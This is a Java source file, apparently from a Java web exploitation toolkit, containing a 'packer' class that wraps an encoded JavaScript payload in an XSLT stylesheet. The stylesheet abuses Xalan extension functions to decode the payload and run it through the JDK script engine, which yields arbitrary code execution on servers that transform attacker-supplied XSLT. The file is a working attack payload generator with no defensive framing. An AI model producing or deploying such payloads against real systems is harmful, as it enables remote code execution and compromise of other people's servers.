package com.reajason.javaweb.packer.xslt;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * JDK 1.6 ~ 1.8 XSLT payload (Xalan Java extension functions): decodes the
 * JavaScript payload with javax.xml.bind.DatatypeConverter (bundled since JDK6,
 * removed in JDK11) and evaluates it through the built-in ScriptEngineManager
 * js engine (Rhino on JDK 1.6/1.7, Nashorn on JDK 1.8).
 *
 * @author ReaJason
 * @since 2026/8/30
 */
public class XSLTScriptEnginePacker implements Packer {
    String template = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" " +
            "xmlns:base=\"http://xml.apache.org/xalan/java/javax.xml.bind.DatatypeConverter\" " +
            "xmlns:stringclazz=\"http://xml.apache.org/xalan/java/java.lang.String\" " +
            "xmlns:jsclazz=\"http://xml.apache.org/xalan/java/javax.script.ScriptEngineManager\" " +
            "xmlns:jseclazz=\"http://xml.apache.org/xalan/java/javax.script.ScriptEngine\" " +
            "exclude-result-prefixes=\"base stringclazz jsclazz jseclazz\">" +
            "<xsl:template match=\"/\">" +
            "<xsl:variable name=\"payload\" select=\"stringclazz:new(base:parseBase64Binary('{{base64Str}}'))\"/>" +
            "<xsl:variable name=\"jsobj\" select=\"jsclazz:new()\"/>" +
            "<xsl:variable name=\"jso\" select=\"jsclazz:getEngineByName($jsobj,'js')\"/>" +
            "<xsl:variable name=\"jse\" select=\"jseclazz:eval($jso,$payload)\"/>" +
            "<xsl:value-of select=\"$jse\"/>" +
            "</xsl:template>" +
            "</xsl:stylesheet>";

    @Override
    public String pack(ClassPackerConfig config) {
        String js = Packers.DefaultScriptEngine.getInstance().pack(config);
        return template.replace("{{base64Str}}",
                Base64.getEncoder().encodeToString(js.getBytes(StandardCharsets.UTF_8)));
    }
}
